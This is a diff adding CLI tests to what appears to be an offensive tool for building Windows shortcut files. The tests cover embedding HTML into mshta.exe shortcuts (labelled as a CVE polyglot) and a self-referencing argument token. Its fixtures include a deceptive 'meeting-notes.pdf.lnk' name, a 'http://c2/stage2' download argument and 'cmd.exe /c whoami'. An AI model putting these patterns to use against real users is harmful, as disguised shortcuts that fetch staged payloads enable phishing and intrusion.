@@ -820,3 +820,156 @@ class TestPadCharCLI:
         data = json.loads(result.stdout)
         assert data["arguments"].startswith("\n\r")
         assert data["arguments"].endswith("/c calc.exe")
+
+
+class TestEmbedHtml:
+    """CLI tests for --embed-html (CVE-2026-21513 mshta polyglot)."""
+
+    def test_embed_html_appends_content(self, tmp_path):
+        html = tmp_path / "exploit.html"
+        html.write_text("<html><body><script>alert(1)</script></body></html>")
+        out = tmp_path / "polyglot.lnk"
+        result = run_cli(
+            "build",
+            r"C:\Windows\System32\mshta.exe",
+            "--embed-html",
+            str(html),
+            "-o",
+            str(out),
+        )
+        assert result.returncode == 0
+        data = out.read_bytes()
+        assert data.endswith(b"<html><body><script>alert(1)</script></body></html>")
+
+    def test_embed_html_auto_sets_arguments(self, tmp_path):
+        html = tmp_path / "payload.html"
+        html.write_text("<html></html>")
+        out = tmp_path / "meeting-notes.pdf.lnk"
+        result = run_cli(
+            "build",
+            r"C:\Windows\System32\mshta.exe",
+            "--embed-html",
+            str(html),
+            "-o",
+            str(out),
+        )
+        assert result.returncode == 0
+        result = run_cli("parse", "--json", str(out))
+        data = json.loads(result.stdout)
+        assert data["arguments"] == "meeting-notes.pdf.lnk"
+
+    def test_embed_html_preserves_explicit_arguments(self, tmp_path):
+        html = tmp_path / "payload.html"
+        html.write_text("<html></html>")
+        out = tmp_path / "polyglot.lnk"
+        result = run_cli(
+            "build",
+            r"C:\Windows\System32\mshta.exe",
+            "--embed-html",
+            str(html),
+            "--arguments",
+            "http://c2/stage2",
+            "-o",
+            str(out),
+        )
+        assert result.returncode == 0
+        result = run_cli("parse", "--json", str(out))
+        data = json.loads(result.stdout)
+        assert data["arguments"] == "http://c2/stage2"
+
+    def test_embed_html_file_not_found(self, tmp_path):
+        result = run_cli(
+            "build",
+            r"C:\Windows\System32\mshta.exe",
+            "--embed-html",
+            str(tmp_path / "nonexistent.html"),
+            "-o",
+            str(tmp_path / "out.lnk"),
+        )
+        assert result.returncode != 0
+        assert "not found" in result.stderr
+
+    def test_embed_html_and_append_mutually_exclusive(self, tmp_path):
+        html = tmp_path / "payload.html"
+        html.write_text("<html></html>")
+        result = run_cli(
+            "build",
+            r"C:\Windows\System32\mshta.exe",
+            "--embed-html",
+            str(html),
+            "--append",
+            str(html),
+            "-o",
+            str(tmp_path / "out.lnk"),
+        )
+        assert result.returncode != 0
+
+    def test_embed_html_parseable(self, tmp_path):
+        html = tmp_path / "payload.html"
+        html.write_bytes(b"<html>" + b"A" * 500 + b"</html>")
+        out = tmp_path / "poly.lnk"
+        run_cli(
+            "build",
+            r"C:\Windows\System32\mshta.exe",
+            "--embed-html",
+            str(html),
+            "-o",
+            str(out),
+        )
+        result = run_cli("parse", "--json", str(out))
+        assert result.returncode == 0
+        data = json.loads(result.stdout)
+        assert data["target_path"] == r"C:\Windows\System32\mshta.exe"
+
+
+class TestSelfToken:
+    """CLI tests for %%SELF%% argument token substitution."""
+
+    def test_self_token_substituted(self, tmp_path):
+        out = tmp_path / "self-ref.lnk"
+        result = run_cli(
+            "build",
+            r"C:\Windows\System32\mshta.exe",
+            "--arguments",
+            "%SELF%",
+            "-o",
+            str(out),
+        )
+        assert result.returncode == 0
+        result = run_cli("parse", "--json", str(out))
+        data = json.loads(result.stdout)
+        assert data["arguments"] == "self-ref.lnk"
+
+    def test_self_token_no_match_unchanged(self, tmp_path):
+        out = tmp_path / "notoken.lnk"
+        result = run_cli(
+            "build",
+            r"C:\Windows\System32\cmd.exe",
+            "--arguments",
+            "/c whoami",
+            "-o",
+            str(out),
+        )
+        assert result.returncode == 0
+        result = run_cli("parse", "--json", str(out))
+        data = json.loads(result.stdout)
+        assert data["arguments"] == "/c whoami"
+
+    def test_self_token_with_embed_html(self, tmp_path):
+        html = tmp_path / "payload.html"
+        html.write_text("<html></html>")
+        out = tmp_path / "combo.lnk"
+        result = run_cli(
+            "build",
+            r"C:\Windows\System32\mshta.exe",
+            "--embed-html",
+            str(html),
+            "--arguments",
+            "%SELF%",
+            "-o",
+            str(out),
+        )
+        assert result.returncode == 0
+        result = run_cli("parse", "--json", str(out))
+        data = json.loads(result.stdout)
+        assert data["arguments"] == "combo.lnk"
